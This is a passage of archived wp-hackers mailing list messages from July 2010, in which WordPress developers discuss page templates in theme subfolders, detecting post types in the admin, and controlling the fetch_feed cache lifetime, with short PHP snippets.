if (isset($_REQUEST['previousRole']) and $_REQUEST['previousRole'] != 'Pending') { return ; }  // from my action above
...
//The rest of the notify function

}

Hope this helps someone else in the future.  I think I am going to make a real plugin out of this to provide this functionality with an admin for the message.  

Andrew, I like both your ideas, and  I will work on a patch to solve this in a better method


thanks,

> 
> 

From KrisY at tbs.uk.com  Wed Jul 14 11:31:07 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Wed, 14 Jul 2010 12:31:07 +0100
Subject: [wp-hackers]  Problems recognising templates in the file system
In-Reply-To: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com>
References: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>

Are there strict requirements from WordPress in regards to identifying
and using templates within the file system? Two problems have come up
since trying to organise my file structure a little better - I'm a
stickler for tidy dev environments, and comprehensive file structuring.

Arranging templates into a new folder under the root theme folder has
stopped WP from recognising them. The same goes for moving them back
into the default theme folder and renaming those templates with a hyphen
(so template-blog.php, rather than with an underscore). Undoing both of
these changes fixes the problem, but I want either of those two changes
I made to stand. Preferably both, actually.

Any way around this problem?

Kris

From wphackers at jakemgold.myfastmail.com  Wed Jul 14 16:34:05 2010
From: wphackers at jakemgold.myfastmail.com (Jake Goldman)
Date: Wed, 14 Jul 2010 12:34:05 -0400
Subject: [wp-hackers] Problems recognising templates in the file system
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>
References: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>
Message-ID: <4C3DE6FD.1080205@jakemgold.myfastmail.com>

  http://codex.wordpress.org/Template_Hierarchy

That should answer most of your questions.

If you're referring to custom page templates, pages are assigned meta 
data with the script name of the template files. If you rename the 
template, all current page's assigned that template will "lose" their 
assignment.

In theory, you could write some code that checks that meta data value 
for an old template and updates it with the new script name. Of course, 
for smaller sites, that's probably silly compared with just reassigning 
the template and update the pages.

Jake


On 7/14/2010 7:31 AM, Kris Young wrote:
> Are there strict requirements from WordPress in regards to identifying
> and using templates within the file system? Two problems have come up
> since trying to organise my file structure a little better - I'm a
> stickler for tidy dev environments, and comprehensive file structuring.
>
> Arranging templates into a new folder under the root theme folder has
> stopped WP from recognising them. The same goes for moving them back
> into the default theme folder and renaming those templates with a hyphen
> (so template-blog.php, rather than with an underscore). Undoing both of
> these changes fixes the problem, but I want either of those two changes
> I made to stand. Preferably both, actually.
>
> Any way around this problem?
>
> Kris
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Wed Jul 14 18:12:50 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 14 Jul 2010 14:12:50 -0400
Subject: [wp-hackers] Problems recognising templates in the file system
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>
References: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>
Message-ID: <CBC897EF-41DD-45F2-B33F-286EB19CF36B@newclarity.net>

Hi Kris,

I see Jake Goldman answered you so I won't duplicate his response. 
 OTOH you might be interested in learning that many others are working on similar. Here is a trac ticket that may gain some traction on the topic:

http://core.trac.wordpress.org/ticket/12877

-Mike

On Jul 14, 2010, at 7:31 AM, Kris Young wrote:

> Are there strict requirements from WordPress in regards to identifying
> and using templates within the file system? Two problems have come up
> since trying to organise my file structure a little better - I'm a
> stickler for tidy dev environments, and comprehensive file structuring.
> 
> Arranging templates into a new folder under the root theme folder has
> stopped WP from recognising them. The same goes for moving them back
> into the default theme folder and renaming those templates with a hyphen
> (so template-blog.php, rather than with an underscore). Undoing both of
> these changes fixes the problem, but I want either of those two changes
> I made to stand. Preferably both, actually.
> 
> Any way around this problem?
> 
> Kris
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From scribu at gmail.com  Wed Jul 14 20:40:32 2010
From: scribu at gmail.com (scribu)
Date: Wed, 14 Jul 2010 23:40:32 +0300
Subject: [wp-hackers] Problems recognising templates in the file system
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>
References: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>
Message-ID: <AANLkTilScgZhqejArL_c4Roq_fr-zrG9MkD4nv4sAldJ@mail.gmail.com>

On Wed, Jul 14, 2010 at 2:31 PM, Kris Young <KrisY at tbs.uk.com> wrote:

> Arranging templates into a new folder under the root theme folder has
> stopped WP from recognising them. The same goes for moving them back
> into the default theme folder and renaming those templates with a hyphen
> (so template-blog.php, rather than with an underscore). Undoing both of
> these changes fixes the problem, but I want either of those two changes
> I made to stand. Preferably both, actually.
>


Regarding page templates in a sub-folder, you might want to read this:

http://core.trac.wordpress.org/ticket/10959


-- 
http://scribu.net

From scribu at gmail.com  Wed Jul 14 20:43:35 2010
From: scribu at gmail.com (scribu)
Date: Wed, 14 Jul 2010 23:43:35 +0300
Subject: [wp-hackers] Problems recognising templates in the file system
In-Reply-To: <AANLkTilScgZhqejArL_c4Roq_fr-zrG9MkD4nv4sAldJ@mail.gmail.com>
References: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>
	<AANLkTilScgZhqejArL_c4Roq_fr-zrG9MkD4nv4sAldJ@mail.gmail.com>
Message-ID: <AANLkTillRmLwomf2ZsdZWbARk8wivNkX8SuGcg1a4LpD@mail.gmail.com>

On Wed, Jul 14, 2010 at 11:40 PM, scribu <scribu at gmail.com> wrote:

> Regarding page templates in a sub-folder, you might want to read this:
>
> http://core.trac.wordpress.org/ticket/10959
>

Or, if you want to skip the history, just go to:

http://core.trac.wordpress.org/ticket/11216 (Support page templates located
in a subdirectory of the theme)


-- 
http://scribu.net

From bernard.d.tremblay at gmail.com  Thu Jul 15 02:21:33 2010
From: bernard.d.tremblay at gmail.com (Bernard D. Tremblay (ben))
Date: Wed, 14 Jul 2010 20:21:33 -0600
Subject: [wp-hackers] pipermail busted?
In-Reply-To: <mailman.10476.1279071304.1338.wp-hackers@lists.automattic.com>
References: <mailman.10476.1279071304.1338.wp-hackers@lists.automattic.com>
Message-ID: <4C3E70AD.70702@gmail.com>

I'm at 
http://lists.automattic.com/pipermail/wp-hackers/2010-July/date.html 
(confirming that my VATSIM query went in) and I read this:
*Starting:* /Thu Jul 1 03:50:23 UTC 2010/
*Ending:* /Wed Jul 14 20:43:35 UTC 2010

/But the most recent post is vm at linksalpha.com's "How to get a plugin 
URL working on WordPress *V M* " ... date-stamp:
/Thu Jul 1 03:50:23 UTC 2010

/'sup?

bdt

--
If you look to see how the system works
Likely you will find that it doesn't.


From lox.dev at knc.nc  Thu Jul 15 03:55:15 2010
From: lox.dev at knc.nc (Lox)
Date: Thu, 15 Jul 2010 14:55:15 +1100
Subject: [wp-hackers] Best way to detect post type in admin
Message-ID: <AANLkTinvzDYJViCsOQjptqggTlEY6XbbB8gk_hdSC1RS@mail.gmail.com>

Hello,

In a plug-in I want to enqueue scripts only on a specific post type
new/edit form page.

What is the best way to achieve it ?

I ended up by doing this:

if(is_admin()) {
    if( isset($_GET['post_type']) ) $post_type = $_GET['post_type'];
    else if( isset($_GET['post']) && isset($_GET['action']) &&
$_GET['action'] === 'edit') $post_type = get_post_type($_GET['post']);

    if($post_type === 'posttype') {
       // enqueue scripts
    }
}

But it also includes script on the custom posts list page, witch I don't want.

Isn't it a "cleaner" way to do it ?

-- 
Lox
lox.dev at knc.nc

From list at expost.org  Thu Jul 15 04:16:40 2010
From: list at expost.org (Raj)
Date: Thu, 15 Jul 2010 09:46:40 +0530
Subject: [wp-hackers] Clearing Feed Cache?
Message-ID: <001b01cb23d4$8808ad20$981a0760$@org>

Hi,

 

I have been using fetch_feed to work with external feeds in my plugin. I
have noticed that even after some times in the feed have been removed, the
feed items remain in the simplepie object returned by the fetch_feed
function. Does this mean that the feed is automatically cached? How  can I
clear this cache?

 

Raj Sekharan


From otto at ottodestruct.com  Thu Jul 15 04:22:01 2010
From: otto at ottodestruct.com (Otto)
Date: Wed, 14 Jul 2010 23:22:01 -0500
Subject: [wp-hackers] Clearing Feed Cache?
In-Reply-To: <001b01cb23d4$8808ad20$981a0760$@org>
References: <001b01cb23d4$8808ad20$981a0760$@org>
Message-ID: <AANLkTiktfjIVDfA6joFqg9CydvKnmnU_rlnMlOMJex5O@mail.gmail.com>

Yes, the feed is cached for 12 hours. If you look in the options
table, you can find the feed cached there.

-Otto



On Wed, Jul 14, 2010 at 11:16 PM, Raj <list at expost.org> wrote:
> Hi,
>
>
>
> I have been using fetch_feed to work with external feeds in my plugin. I
> have noticed that even after some times in the feed have been removed, the
> feed items remain in the simplepie object returned by the fetch_feed
> function. Does this mean that the feed is automatically cached? How ?can I
> clear this cache?
>
>
>
> Raj Sekharan
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Thu Jul 15 06:41:56 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Thu, 15 Jul 2010 02:41:56 -0400
Subject: [wp-hackers] Best way to detect post type in admin
In-Reply-To: <AANLkTinvzDYJViCsOQjptqggTlEY6XbbB8gk_hdSC1RS@mail.gmail.com>
References: <AANLkTinvzDYJViCsOQjptqggTlEY6XbbB8gk_hdSC1RS@mail.gmail.com>
Message-ID: <AANLkTin87JrmIBh2sxsQSt0e70VJspvRYsw_tJMVkWEA@mail.gmail.com>

On Wed, Jul 14, 2010 at 11:55 PM, Lox <lox.dev at knc.nc> wrote:

> In a plug-in I want to enqueue scripts only on a specific post type
> new/edit form page.
>

$typenow will contain the post type. See the $current_screen object for more
context. (There's also $taxnow, $pagenow, and others. $current_screen
definitely the best thing to inspect.)

From wp at andrewnacin.com  Thu Jul 15 06:50:19 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Thu, 15 Jul 2010 02:50:19 -0400
Subject: [wp-hackers] Clearing Feed Cache?
In-Reply-To: <AANLkTiktfjIVDfA6joFqg9CydvKnmnU_rlnMlOMJex5O@mail.gmail.com>
References: <001b01cb23d4$8808ad20$981a0760$@org>
	<AANLkTiktfjIVDfA6joFqg9CydvKnmnU_rlnMlOMJex5O@mail.gmail.com>
Message-ID: <AANLkTim-cRLl7jILdjey-j3ng9u2JkW-gldSHRede3LI@mail.gmail.com>

If you look in fetch_feed(), you'll see a few filters. One of them allows
you to alter the cache length. I think there's an easy way to clear it as
well but if not then that would be a good patch.

On Thu, Jul 15, 2010 at 12:22 AM, Otto <otto at ottodestruct.com> wrote:

> Yes, the feed is cached for 12 hours. If you look in the options
> table, you can find the feed cached there.
>
> -Otto
>
>
>
> On Wed, Jul 14, 2010 at 11:16 PM, Raj <list at expost.org> wrote:
> > Hi,
> >
> >
> >
> > I have been using fetch_feed to work with external feeds in my plugin. I
> > have noticed that even after some times in the feed have been removed,
> the
> > feed items remain in the simplepie object returned by the fetch_feed
> > function. Does this mean that the feed is automatically cached? How  can
> I
> > clear this cache?
> >
> >
> >
> > Raj Sekharan
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From frank at bueltge.de  Thu Jul 15 07:09:58 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Thu, 15 Jul 2010 09:09:58 +0200
Subject: [wp-hackers] Clearing Feed Cache?
In-Reply-To: <AANLkTim-cRLl7jILdjey-j3ng9u2JkW-gldSHRede3LI@mail.gmail.com>
References: <001b01cb23d4$8808ad20$981a0760$@org>
	<AANLkTiktfjIVDfA6joFqg9CydvKnmnU_rlnMlOMJex5O@mail.gmail.com> 
	<AANLkTim-cRLl7jILdjey-j3ng9u2JkW-gldSHRede3LI@mail.gmail.com>
Message-ID: <AANLkTiks9T4h8Sd_JyJszVJJ4HTz05ICazFMQCk-wgML@mail.gmail.com>

add_filter( 'wp_feed_cache_transient_lifetime', create_function( '$a',
'return 1800;' ) );

use this filter to set a new time for the cache.
more also in my post: http://wpengineer.com/feed-cache-in-wordpress/

Best regards
Frank


On Thu, Jul 15, 2010 at 8:50 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
>
> If you look in fetch_feed(), you'll see a few filters. One of them allows
> you to alter the cache length. I think there's an easy way to clear it as
> well but if not then that would be a good patch.
>
> On Thu, Jul 15, 2010 at 12:22 AM, Otto <otto at ottodestruct.com> wrote:
>
> > Yes, the feed is cached for 12 hours. If you look in the options
> > table, you can find the feed cached there.
> >
> > -Otto
> >
> >
> >
> > On Wed, Jul 14, 2010 at 11:16 PM, Raj <list at expost.org> wrote:
> > > Hi,
> > >
> > >
> > >
> > > I have been using fetch_feed to work with external feeds in my plugin. I
> > > have noticed that even after some times in the feed have been removed,
> > the
> > > feed items remain in the simplepie object returned by the fetch_feed
> > > function. Does this mean that the feed is automatically cached? How ?can
> > I
> > > clear this cache?
> > >
> > >
> > >
> > > Raj Sekharan
> > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From frank at bueltge.de  Thu Jul 15 07:12:38 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Thu, 15 Jul 2010 09:12:38 +0200
Subject: [wp-hackers] custom_post_type und revisons
Message-ID: <AANLkTikaZoD7XozyrKt7KGXAiF5l6RIvuqmko4WVr6hR@mail.gmail.com>

small idea, it is possible to add a backend for the exists revisions-post_type
It is possible to overwrite the core-function to add this type.

Maybe i will use the revisions to vie all revisions in the extra
frontend and extra backend area. I think, it was small code for use
this post-type with the default functions for custom post type.

Thanks for your time.

From lox.dev at knc.nc  Thu Jul 15 07:14:09 2010
From: lox.dev at knc.nc (Lox)
Date: Thu, 15 Jul 2010 18:14:09 +1100
Subject: [wp-hackers] Best way to detect post type in admin
In-Reply-To: <AANLkTin87JrmIBh2sxsQSt0e70VJspvRYsw_tJMVkWEA@mail.gmail.com>
References: <AANLkTinvzDYJViCsOQjptqggTlEY6XbbB8gk_hdSC1RS@mail.gmail.com> 
	<AANLkTin87JrmIBh2sxsQSt0e70VJspvRYsw_tJMVkWEA@mail.gmail.com>
Message-ID: <AANLkTilRIENVrdvNMYJXa3w6qNqlt1fHH_z8JPbCSl84@mail.gmail.com>

2010/7/15 Andrew Nacin <wp at andrewnacin.com>:
> $typenow will contain the post type. See the $current_screen object for more
> context. (There's also $taxnow, $pagenow, and others. $current_screen
> definitely the best thing to inspect.)

Nice thks. But $current_screen object is not available at init and
admin_init time.

I ended up by using admin_enqueue_scripts hook like this:

        function admin_enqueue_scripts ()
	{
		
		global $current_screen;
		
		if( $current_screen->post_type !== 'winner') return;
		if( $current_screen->action !== 'add' && (!isset($_GET['action']) ||
$_GET['action'] !== 'edit') ) return;
		
		wp_enqueue_script('editor');
		
	}

Something weird, when creating a new post, $current_screen->action is
set to 'add' whereas when editing it, it is empty...
Shouldn't it be set to 'edit' ? Is that a bug that needs to be reported?

-- 
Lox
lox.dev at knc.nc

From KrisY at tbs.uk.com  Thu Jul 15 07:53:03 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Thu, 15 Jul 2010 08:53:03 +0100
Subject: [wp-hackers] Problems recognising templates in the file system
In-Reply-To: <AANLkTillRmLwomf2ZsdZWbARk8wivNkX8SuGcg1a4LpD@mail.gmail.com>
References: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com><CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local><AANLkTilScgZhqejArL_c4Roq_fr-zrG9MkD4nv4sAldJ@mail.gmail.com>
	<AANLkTillRmLwomf2ZsdZWbARk8wivNkX8SuGcg1a4LpD@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E307E@tbs-sbs01.TBS.local>

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of scribu
Sent: 14 July 2010 21:44
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Problems recognising templates in the file
system

On Wed, Jul 14, 2010 at 11:40 PM, scribu <scribu at gmail.com> wrote:

> Regarding page templates in a sub-folder, you might want to read this:
>
> http://core.trac.wordpress.org/ticket/10959
>

Or, if you want to skip the history, just go to:

http://core.trac.wordpress.org/ticket/11216 (Support page templates
located
in a subdirectory of the theme)

-----

This is exactly what I'm looking for. Is this all that needs to be
changed?

http://core.trac.wordpress.org/changeset/12187

Kris

From wp at andrewnacin.com  Thu Jul 15 08:44:20 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Thu, 15 Jul 2010 04:44:20 -0400
Subject: [wp-hackers] Problems recognising templates in the file system
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E307E@tbs-sbs01.TBS.local>
References: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local> 
	<AANLkTilScgZhqejArL_c4Roq_fr-zrG9MkD4nv4sAldJ@mail.gmail.com> 
	<AANLkTillRmLwomf2ZsdZWbARk8wivNkX8SuGcg1a4LpD@mail.gmail.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E307E@tbs-sbs01.TBS.local>
Message-ID: <AANLkTin4mrD8-3jMHNPa00FR5dpmXakYWVVYplovrQwo@mail.gmail.com>

On Thu, Jul 15, 2010 at 3:53 AM, Kris Young <KrisY at tbs.uk.com> wrote:

> This is exactly what I'm looking for. Is this all that needs to be
> changed?
>
> http://core.trac.wordpress.org/changeset/12187


That was reverted because it didn't always work and introduced some
problems. That ticket spawned http://core.trac.wordpress.org/ticket/11216.

From KrisY at tbs.uk.com  Thu Jul 15 09:04:26 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Thu, 15 Jul 2010 10:04:26 +0100
Subject: [wp-hackers] Problems recognising templates in the file system
In-Reply-To: <AANLkTin4mrD8-3jMHNPa00FR5dpmXakYWVVYplovrQwo@mail.gmail.com>
References: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E305E@tbs-sbs01.TBS.local>
	<AANLkTilScgZhqejArL_c4Roq_fr-zrG9MkD4nv4sAldJ@mail.gmail.com>
	<AANLkTillRmLwomf2ZsdZWbARk8wivNkX8SuGcg1a4LpD@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E307E@tbs-sbs01.TBS.local>
	<AANLkTin4mrD8-3jMHNPa00FR5dpmXakYWVVYplovrQwo@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E308E@tbs-sbs01.TBS.local>

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Andrew
Nacin
Sent: 15 July 2010 09:44
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Problems recognising templates in the file
system

On Thu, Jul 15, 2010 at 3:53 AM, Kris Young <KrisY at tbs.uk.com> wrote:

> This is exactly what I'm looking for. Is this all that needs to be
> changed?
>
> http://core.trac.wordpress.org/changeset/12187


That was reverted because it didn't always work and introduced some
problems. That ticket spawned
http://core.trac.wordpress.org/ticket/11216.

----

You're definitely one of the best people to ask about this, Andrew. Is
this a change that WP are planning for the future as part of the core
system?

Kris


From batmoo at gmail.com  Thu Jul 15 14:01:21 2010
From: batmoo at gmail.com (Mohammad Jangda)
Date: Thu, 15 Jul 2010 10:01:21 -0400
Subject: [wp-hackers] Best way to detect post type in admin
In-Reply-To: <AANLkTilRIENVrdvNMYJXa3w6qNqlt1fHH_z8JPbCSl84@mail.gmail.com>
References: <AANLkTinvzDYJViCsOQjptqggTlEY6XbbB8gk_hdSC1RS@mail.gmail.com> 
	<AANLkTin87JrmIBh2sxsQSt0e70VJspvRYsw_tJMVkWEA@mail.gmail.com> 
	<AANLkTilRIENVrdvNMYJXa3w6qNqlt1fHH_z8JPbCSl84@mail.gmail.com>
Message-ID: <AANLkTilksz7ob4Vh_g2xqVh-BB1F_k0SthaLJBFDStHH@mail.gmail.com>

>
> Nice thks. But $current_screen object is not available at init
> and admin_init time


I ran into the same issue and found that it's better to do the check in
later hooks, since only $_REQUEST['post_type'] works on the init and
admin_init hooks and even then, only on certain pages.

In a plug-in I want to enqueue scripts only on a specific post type new/edit
> form page. What is the best way to achieve it ?


Here's a function I use (in case the formatting gets warped find it here:
http://gist.github.com/476964). It didn't originally have $current_screen,
so thanks for the tip Nacin!

/**
 * Gets the current global post type if one is set
 */
function get_current_post_type() {
global $post, $typenow, $current_screen;
 if( $post && $post->post_type )
$post_type = $post->post_type;
 elseif( $typenow )
$post_type = $typenow;
elseif( $current_screen && $current_screen->post_type )
 $post_type = $current_screen->post_type;
elseif( $_REQUEST['post_type'] )
 $post_type = sanitize_key( $_REQUEST['post_type'] );
else
$post_type = '';
 return $post_type;
}

Note: if you're going to use the function, prefix the name to avoid
conflicts.

--
Mohammad Jangda
www.digitalize.ca | @mjangda

From jpotkanski at tribune.com  Thu Jul 15 15:02:44 2010
From: jpotkanski at tribune.com (Potkanski, Jason)
Date: Thu, 15 Jul 2010 10:02:44 -0500
Subject: [wp-hackers] Clearing Feed Cache?
In-Reply-To: <AANLkTiks9T4h8Sd_JyJszVJJ4HTz05ICazFMQCk-wgML@mail.gmail.com>
References: <001b01cb23d4$8808ad20$981a0760$@org>
	<AANLkTiktfjIVDfA6joFqg9CydvKnmnU_rlnMlOMJex5O@mail.gmail.com>
	<AANLkTim-cRLl7jILdjey-j3ng9u2JkW-gldSHRede3LI@mail.gmail.com>
	<AANLkTiks9T4h8Sd_JyJszVJJ4HTz05ICazFMQCk-wgML@mail.gmail.com>
Message-ID: <7A06A0AED9867C4C8B285D2D5D60B19C54C2D42AD9@FCWPMB06.usa.tribune.com>

Is there a way to set this up so one type of feed has a shorter cache lifetime?

Say I use xml sitemaps and want the sitemap feed to be 5 minutes but the rss, rss2, atom etc as 12 hours.

-Jason Potkanski
Tribune Technology

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Frank Bueltge
Sent: Thursday, July 15, 2010 2:10 AM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Clearing Feed Cache?

add_filter( 'wp_feed_cache_transient_lifetime', create_function( '$a',
'return 1800;' ) );

use this filter to set a new time for the cache.
more also in my post: http://wpengineer.com/feed-cache-in-wordpress/

Best regards
Frank


On Thu, Jul 15, 2010 at 8:50 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
>
> If you look in fetch_feed(), you'll see a few filters. One of them allows
> you to alter the cache length. I think there's an easy way to clear it as
> well but if not then that would be a good patch.
>
> On Thu, Jul 15, 2010 at 12:22 AM, Otto <otto at ottodestruct.com> wrote:
>
> > Yes, the feed is cached for 12 hours. If you look in the options
> > table, you can find the feed cached there.
> >
> > -Otto
> >
> >
> >
> > On Wed, Jul 14, 2010 at 11:16 PM, Raj <list at expost.org> wrote:
> > > Hi,
> > >
> > >
> > >
> > > I have been using fetch_feed to work with external feeds in my plugin. I
> > > have noticed that even after some times in the feed have been removed,
> > the
> > > feed items remain in the simplepie object returned by the fetch_feed
> > > function. Does this mean that the feed is automatically cached? How ?can
> > I
> > > clear this cache?
> > >
> > >
> > >
> > > Raj Sekharan
> > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From frank at bueltge.de  Thu Jul 15 15:26:48 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Thu, 15 Jul 2010 17:26:48 +0200
Subject: [wp-hackers] Clearing Feed Cache?
In-Reply-To: <7A06A0AED9867C4C8B285D2D5D60B19C54C2D42AD9@FCWPMB06.usa.tribune.com>
References: <001b01cb23d4$8808ad20$981a0760$@org>
	<AANLkTiktfjIVDfA6joFqg9CydvKnmnU_rlnMlOMJex5O@mail.gmail.com> 
	<AANLkTim-cRLl7jILdjey-j3ng9u2JkW-gldSHRede3LI@mail.gmail.com> 
	<AANLkTiks9T4h8Sd_JyJszVJJ4HTz05ICazFMQCk-wgML@mail.gmail.com> 
	<7A06A0AED9867C4C8B285D2D5D60B19C54C2D42AD9@FCWPMB06.usa.tribune.com>
Message-ID: <AANLkTim4GiqHegWlwEcEWgohVgq_xk20PuzLq62GTK7g@mail.gmail.com>

You can use the plugin Crontrol to see and edit your crons. Maybe is
this an easier solution.
The hook wp_feed_cache_transient_life works on functino fetch_feed,
use the library simplepie. I cant a different to read rss2 or atom to
change the cache. I think, when you like this, you must add own crons
for the cache control.



On Thu, Jul 15, 2010 at 5:02 PM, Potkanski, Jason
<jpotkanski at tribune.com> wrote:
> Is there a way to set this up so one type of feed has a shorter cache lifetime?
>
> Say I use xml sitemaps and want the sitemap feed to be 5 minutes but the rss, rss2, atom etc as 12 hours.
>
> -Jason Potkanski
> Tribune Technology
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Frank Bueltge
> Sent: Thursday, July 15, 2010 2:10 AM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Clearing Feed Cache?
>
> add_filter( 'wp_feed_cache_transient_lifetime', create_function( '$a',
> 'return 1800;' ) );
>
> use this filter to set a new time for the cache.
> more also in my post: http://wpengineer.com/feed-cache-in-wordpress/
>
> Best regards
> Frank
>
>
> On Thu, Jul 15, 2010 at 8:50 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
>>
>> If you look in fetch_feed(), you'll see a few filters. One of them allows
>> you to alter the cache length. I think there's an easy way to clear it as
>> well but if not then that would be a good patch.
>>
>> On Thu, Jul 15, 2010 at 12:22 AM, Otto <otto at ottodestruct.com> wrote:
>>
>> > Yes, the feed is cached for 12 hours. If you look in the options
>> > table, you can find the feed cached there.
>> >
>> > -Otto
>> >
>> >
>> >
>> > On Wed, Jul 14, 2010 at 11:16 PM, Raj <list at expost.org> wrote:
>> > > Hi,
>> > >
>> > >
>> > >
>> > > I have been using fetch_feed to work with external feeds in my plugin. I
>> > > have noticed that even after some times in the feed have been removed,
>> > the
>> > > feed items remain in the simplepie object returned by the fetch_feed
>> > > function. Does this mean that the feed is automatically cached? How ?can
>> > I
>> > > clear this cache?
>> > >
>> > >
>> > >
>> > > Raj Sekharan
>> > >
>> > > _______________________________________________
>> > > wp-hackers mailing list
>> > > wp-hackers at lists.automattic.com
>> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > >
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Thu Jul 15 16:27:49 2010
From: otto at ottodestruct.com (Otto)
Date: Thu, 15 Jul 2010 11:27:49 -0500
Subject: [wp-hackers] Clearing Feed Cache?
In-Reply-To: <7A06A0AED9867C4C8B285D2D5D60B19C54C2D42AD9@FCWPMB06.usa.tribune.com>
References: <001b01cb23d4$8808ad20$981a0760$@org>
	<AANLkTiktfjIVDfA6joFqg9CydvKnmnU_rlnMlOMJex5O@mail.gmail.com> 
	<AANLkTim-cRLl7jILdjey-j3ng9u2JkW-gldSHRede3LI@mail.gmail.com> 
	<AANLkTiks9T4h8Sd_JyJszVJJ4HTz05ICazFMQCk-wgML@mail.gmail.com> 
	<7A06A0AED9867C4C8B285D2D5D60B19C54C2D42AD9@FCWPMB06.usa.tribune.com>
Message-ID: <AANLkTimIX_ueFMevgY7yWD0AmjkmuPJ2xa4lx0KDnE9a@mail.gmail.com>

I think you're misunderstanding. This is regarding feeds you fetch
from other places, not your own feeds.

-Otto



On Thu, Jul 15, 2010 at 10:02 AM, Potkanski, Jason
<jpotkanski at tribune.com> wrote:
> Is there a way to set this up so one type of feed has a shorter cache lifetime?
>
